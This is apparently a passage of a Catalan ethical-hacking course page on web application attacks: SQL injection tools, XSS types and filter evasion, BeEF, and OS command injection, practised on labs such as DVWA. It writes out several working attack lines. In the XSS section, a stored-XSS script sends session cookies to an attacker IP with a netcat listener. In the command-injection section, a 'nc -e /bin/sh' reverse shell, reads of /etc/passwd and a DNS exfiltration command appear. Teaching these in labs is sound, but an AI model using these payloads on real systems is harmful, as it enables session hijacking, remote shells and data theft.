         <p>Existeixen nombroses eines que permeten automatitzar el proc√©s de detecci√≥ i exfiltraci√≥ de dades
          en vulnerabilitats de injecci√≥ SQL.  Hi ha de lliures, propietaries, espec√©fiques com a part d'una soluci√≥ integrada. Entre les m√©s destacades i conegudes estan:    </p>
          <ul>
            <li>sqlmap</li>
            <li>jSQL injection</li>
            <li>NoSQLMap</li>
            <li>BBQSQL</li>
          </ul>
          <h4>sqlmap</h4>
          <p>√âs una eina de codi obert escrita en python i un test de penetraci√≥ que automatitza el proc√©s de detecci√≥ i explotaci√≥ de vulnerabilitats d'injecci√≥ SQL en 
            aplicacions web i, posteriorment, de presa de control del servidor de la base de dades</p>

          <p>SQLMap ofereix un suport complet per als seg√ºents SGBD, cosa que significa que pot explotar vulnerabilitats, enumerar bases de dades, taules i columnes, i extreure dades amb una gran precisi√≥:
            MySQL i MariaDB, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, i moltes m√©s.        </p>
          <p>A m√©s a m√©s, soporta integraci√≥ amb <strong>Meterpreter</strong> de <strong>Metasploit</strong></p>


          <p>Aquest v√≠deo tutorial mostra com fer servir SQLMap en un entorn de proves, que √©s una manera segura de practicar les t√®cniques d'auditoria
             <a href="https://www.youtube.com/watch?v=PwFXqUrIpV8">de 12 minuts</a> </p>  
          
          <h4>jSQL Injection</h4>
          <p>√âs una eina multiplataforma de codi obert escrita en java, relativament f√†cil d'utilitzar amb una GUI </p>
          <p>En les ultimes versions de kali no ve incorporada, per√≤ es pot instal¬∑lar f√†cilment amb:</p>
          <code>$ sudo apt update && sudo apt install jsql-injection</code>
          <p>El lloc web <strong>Vulnweb.com</strong> disposa de varios llocs vulnerables on poder practicar</p>

          <h4>NoSQLMap</h4>
          <p>NoSQLMap √©s una eina de codi obert escrita en Python que automatitza la injecci√≥ de codi i altres vulnerabilitats
             en bases de dades NoSQL, especialment en MongoDB i altres bases de dades basades en JSON.</p>
          <p>Aquesta eina est√† dissenyada per a auditar la seguretat de les aplicacions que utilitzen bases de dades NoSQL, 
            ja que les t√®cniques d'injecci√≥ SQL tradicionals no s√≥n aplicables. NoSQLMap es va crear per a omplir el buit que 
            va deixar l'eina SQLMap, ja que aquesta √∫ltima se centra exclusivament en bases de dades SQL</p>
          
          <h4>BBQSQL</h4>
          <p>BBQSQL √©s una eina en linea de comandos de codi obert i escrita en python, que explota la injecci√≥ SQL cega
             (Blind SQL Injection) de manera autom√†tica. A difer√®ncia d'eines com SQLMap, que tenen una l√≤gica 
             complexa per a diferents SGBD i tipus d'injecci√≥, BBQSQL se centra exclusivament en l'explotaci√≥ de la injecci√≥ SQL cega 
             i, per tant, no est√† lligada a un sistema gestor de base de dades (SGBD) espec√≠fic de la mateixa manera que altres eines m√©s generals.</p>
          <p>Encara que no esta lligada a cap SGBD, ofereix plantilles preconfigurades per alguns SGBD comuns, com: 
            MySQL, PostgreSQL, Microsoft SQL Server (MSSQL), Oracle Database, SQLite</p>


        <h2>Cross-Site Scripting XSS</h2>
        <p>El Cross-Site Scripting (XSS) √©s una vulnerabilitat de seguretat en aplicacions web que permet a un atacant injectar scripts maliciosos 
        (generalment JavaScript) en p√†gines web visualitzades per altres usuaris. L'atacant pot utilitzar aquests scripts per a robar dades, 
        segrestar sessions, manipular el contingut del lloc o redirigir usuaris a llocs maliciosos. <br>
        Aquesta vulnerabilitat apareix quan una aplicaci√≥ web no valida ni saneja correctament l'entrada de l'usuari abans de mostrar-la a una altra p√†gina.</p>
        <p>XSS pot explotar-se amb m√∫ltiples prop√≤sits. Els m√©s comuns..</p>
        <ul>
          <li>Fer un "defacement" d'una web</li>
          <li>Capturar Cookies de sessi√≥ d'un usuari =>  <strong>(Session Hijacking  o  Cookie Hijacking) </strong></li>
        </ul>
        <h3>Web defacement</h3>
        <p>El Web Defacement √©s un tipus d'atac a un lloc web on un atacant altera o substitueix la p√†gina principal o 
          una altra p√†gina del lloc per un contingut propi. Aquest contingut malici√≥s pot ser un missatge pol√≠tic, 
          una firma de l'atacant, imatges, m√∫sica o qualsevol altra cosa que l'atacant vulgui mostrar.</p>

        <h3>Tipus de XSS</h3>
        <p>Existeixen tres tipus principals d'atacs XSS, cadascun amb un mecanisme d'explotaci√≥ diferent:</p>
        <ol>
          <li><strong>XSS reflectit (Reflected XSS)</strong></li>
          Aquest tipus d'atac es produeix quan un script malici√≥s s'envia a trav√©s d'una petici√≥ HTTP i es "reflecteix" directament en la resposta del servidor.
          <li><strong>XSS emmagatzemat (Stored XSS)</strong></li>
          √âs el tipus de XSS m√©s perill√≥s. L'atacant injecta un script que s'emmagatzema de manera persistent en la base de dades del servidor.
          <li><strong>XSS basat en DOM (DOM-based XSS)</strong></li>
          En aquest cas, la vulnerabilitat es troba al costat del client, al codi JavaScript de la p√†gina, no al servidor.
        </ol>
        <h4>XSS reflectit (Reflected XSS)</h4>
        <img src="imgs/xss-r-attack.png" alt="r-xss" width="70%" class="imatge-dreta" >   
        <p>Com funciona? L'atacant crea un enlla√ß malici√≥s amb el codi malici√≥s injectat. Normalment es fa arribar a la victima amb Enginyeria Social.
          Quan un usuari(victima) fa clic a l'enlla√ß, la petici√≥ 
          s'envia al servidor, que la processa i inclou el codi a la resposta HTML. El navegador de l'usuari executa el codi malici√≥s
           com si fos una part leg√≠tima de la p√†gina. Carrega i mostra la p√†gina leg√≠tima i a m√©s a m√©s executa el codi malici√≥s</p>
        <p>Exemple: Un atacant podria enviar un enlla√ß com 
        <code>  https://exemple.com/cerca?q=&lt;script>alert('XSS');&lt;/script>. </code>
         Si el servidor reflecteix el par√†metre <strong><code>q</code></strong> sense sanejar-lo, l'script s'executar√† al navegador de l'usuari.</p>
         <p>Tamb√© se sol utilitzar la funcio <code>alert(1)</code> per testar XSS</p>
            <h5>Evasi√≥</h5>
            <p>Per evitar ser detectat per les possibles funcions que netegen el codi, es poden utilitzar algunes t√®cniques..</p>
            <li>En BurpSuit hi ha una opcion per Codificar en hexadecimal (encode as ..url) </li>
            <li>Tamb√© es pot barrejar maj√∫scules <code>=&lt;sCript>alert(1);&lt;/sCript></code> </li>
            <li>Usar altres etiquetes html combinades amb events.. <code> &lt;img src=1 onerror=alert(1)>  </code></li>
        

        <h4>XSS emmagatzemat (Stored XSS)</h4>
        <p>Com funciona? L'atacant introdueix el codi malici√≥s en un camp d'entrada que es desa al servidor, com un comentari 
          en un blog, un missatge en un f√≤rum o el nom d'usuari d'un perfil. Quan qualsevol altre usuari visita la p√†gina que
          mostra aquest contingut, el codi s'executa autom√†ticament al seu navegador.</p>
        <p>Exemple: Un atacant escriu un comentari en un blog que cont√© un script malici√≥s. Quan un altre usuari llegeix el 
          comentari, el script s'executa i roba la seva cookie de sessi√≥, donant a l'atacant acc√©s al seu compte.</p>
            <h5>Robatori de sessions (session hijacking)</h5>
            <p>Per practicar este apartat es pot utilitzar la secci√≥ XXS(Stored) de la DVWA.</p>
            <p>En el formulari posem: <br>
            name: cookie! <br>
            message:  <code> &lt;script> new Image().src="http;//10.0.10.40:8080?+document.cookie &lt;/script> </code></p>
            <p>10.0.10.40 es la ip de l'atacant.</p>
            <p>Desde l'atacant, s'obri un netcat que escolta  <code>nc -lnvp 8080</code></p>
            <p>Esperem a que alg√∫, admin, entre en la p√†gina, i en el netcat obert es rep la cookie (PHPSESSID)</p>
            <p>En el nostre navegador (atacant) , canviem la nostra cookie per la de la victima, i ja som "admin"</p>
            <p>....</p>
            <br><br>
            <p>Hi ha p√†gines on trobar payloads que es poden aplicar en cas de vulnerabilitat</p>
            <p>Visita <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/">PayloadsAllTheThings</a>. En esta web s'oferix un
            llistat extens de posibilitats i combinacions</p>


        <h4>XSS basat en DOM (DOM-based XSS)</h4>
        <p>Quan un navegador carrega una p√†gina web, construeix una estructura de dades del DOM basant-se en el codi HTML del document. El navegador no mostra el codi HTML directament, sin√≥ la representaci√≥ visual del DOM. <br>
          Cada element del document, incloent-hi el text i els atributs, es converteix en un objecte que el DOM organitza en una jerarquia d'arbre.</p>
        <p>Aquesta estructura en forma d'arbre facilita la navegaci√≥ per la p√†gina. L'element arrel √©s document, que cont√© la resta de nodes.
           Per exemple, el node &lt;html> √©s el fill de document, i el &lt;head> i el &lt;body> s√≥n els fills de &lt;html>. 
            Cada node, alhora, pot tenir fills, germans i un pare, cosa que permet als desenvolupadors accedir i manipular qualsevol part de la p√†gina.</p>
        <p>A banda dels nodes HTML, el DOM tamb√© emmagatzema les propietats de la p√†gina, com les cookies, la URL de la que ve la p√†gina (referer), la URL actual, etc..</p>    
        <p>Per m√©s informaci√≥ es recomana consultar la p√†gina de Mozilla Developement Network  <a href="https://developer.mozilla.org/es/docs/Web/API/Document_Object_Model">DOM</a></p>

        <p>Com funciona? El navegador executa un script malici√≥s sense que la p√†gina hagi estat alterada. L'atac es basa 
          en la manipulaci√≥ de l'estructura del DOM (Document Object Model) de la p√†gina a trav√©s de dades que l'usuari 
          ha inserit, com ara un fragment de l'URL.</p>
        <p>Exemple: Una p√†gina utilitza JavaScript per a llegir un par√†metre de l'URL i inserir-lo directament al HTML sense comprovar-ne 
          el contingut. Un atacant pot crear un enlla√ß que injecti un script que manipuli el DOM de la p√†gina.</p>

        <h3>Practica</h3>  
        <p>Per practicar l'XSS es poden utilitzar algun recursos interessants</p>
        <li><a href="https://xss-game.appspot.com/"> XSS Game</a>  </li>
        <li><a href="https://xss-quiz.int21h.jp/">XSS Challenges</a> 19 reptes secuencials..</li>

        <p>I altres....</p>
        <a href="https://xss.challenge.training.hacq.me/">XSS Challenge by y0n3uchy</a>  -.-.-
        <a href="https://www.intigriti.com/researchers/hackademy/xss-challenges">XSS Challenges by intigriti</a>

        <h3>Eina BeEF</h3>
         <img src="imgs/beef-logo.png" alt="r-xss" width="10%" class="imatge-esquerra" >   
        <p>BeEF (Browser Exploitation Framework) √©s una eina de codi obert dissenyada per a auditar
           la seguretat dels navegadors web. A difer√®ncia d'altres eines que s'enfoquen en el servidor, BeEF se centra en el client
            (el navegador de l'usuari). L'eina "injecta" codi JavaScript malici√≥s a un navegador vulnerable i l'utilitza per a controlar-lo de forma remota.</p>
        <p>BeEF facilita les tasques d'explotaci√≥ d'una vulnerabilitat XSS. Es tracta d'un framework que permet llan√ßar un gran numero d'atacs sobre un objectiu comprom√©s.</p>
        <p>Repo de BeEF en <a href="https://github.com/beefproject/beef">Github</a></p>



<!--                
        <h2>Criss-Site Request Forgery CSRF</h2>
        <h2>Server-Side Request Forgery SSRF</h2>
        <h2>Server-Side Template Injection  SSTI</h2>
        <h2>XML External Entity (XXE) Injection</h2>
-->

        <hr>   <h2>OS Command Injection</h2>
        <p>La injecci√≥ de comandes del sistema operatiu (OS Command Injection) √©s una vulnerabilitat de seguretat que 
          permet a un atacant executar comandes del sistema operatiu en un servidor a trav√©s d'una aplicaci√≥ web. 
          Aquesta vulnerabilitat es produeix quan una aplicaci√≥ web utilitza l'entrada de l'usuari per a construir i executar
           una comanda del sistema sense validar-la o sanejar-la correctament.</p>
        <h4>Com funciona?</h4>
        <p>Una aplicaci√≥ web vulnerable sol tindre una funcionalitat que executa una comanda a nivell del sistema operatiu per a
           realitzar una tasca. Per exemple, una p√†gina que permet als usuaris fer un ping a una adre√ßa IP podria usar una comanda com:</p>
          <pre><code>ping $_GET['ip']</code></pre>
        <p>Si l'usuari introdueix una adre√ßa IP v√†lida, la comanda s'executa correctament. No obstant aix√≤, un atacant pot afegir metacar√†cters
           com ";", "|" o "&" (depenent del sistema operatiu) per a encadenar una nova comanda.
         <br> Per exemple, si l'atacant introdueix el seg√ºent valor a la URL:</p>
        <pre><code>localhost; ls -la</code></pre>
        <p>La comanda final que s'executaria al servidor seria:</p>
        <pre><code>ping localhost; ls -la</code></pre>
        <p>Aix√≤ faria que el servidor no nom√©s execut√©s la comanda ping, sin√≥ que tamb√© execut√©s la comanda ls -la, que llista 
          els arxius i directoris del sistema. Aquesta informaci√≥ podria ser √∫til per a un atacant per a planejar atacs futurs.</p>
        <p>Si en compte de posar un <code>ls</code> l'atacant posa un <code>nc</code> (netcat) per obrir una shell inversa ...</p>
        <pre><code>        ; tail /etc/passwd
        ; nc -e /bin/sh 10.0.10.40 4444
        </code></pre>

        <h4>Blind command injection</h4>
        <p>De vegades, els resultats no es mostren en la pagina web resultant, i cal recorrer a t√®niques m√©s sofisticades per poder
          exfiltrar les dades.    </p>
          <li>directoris amb permisos d'escritura</li>
          ; tail /etc/passwd > /var/www/html/dvwa/hackable/uploads/usuarios.txt <br>
          i despres usar LFI amb  10.0.10.50/dvwa/hackable/uploads/usuarios.txt
          <li>t√®cniques Out-of-Band</li>
        dig @IP_DNS_ATACANT 'whoami'.dominio.com &

      </section>         
      <section id="labs">
        <h1>Laboratoris</h1>

      </section>         
     
      

    </main>

    <footer>
      <p style="font-family: 'CCSymbols', sans-serif; font-size:larger;" >
        2025 - Llic√®ncia: &#x1F16D; &#x1F16F; &#x1F10E; &#x1F10F; - U4 - HE a aplicacions WEB 
      </p>
    </footer>
  </div>

  
    <script src="scriptsunitats.js"></script>
</body>
</html>
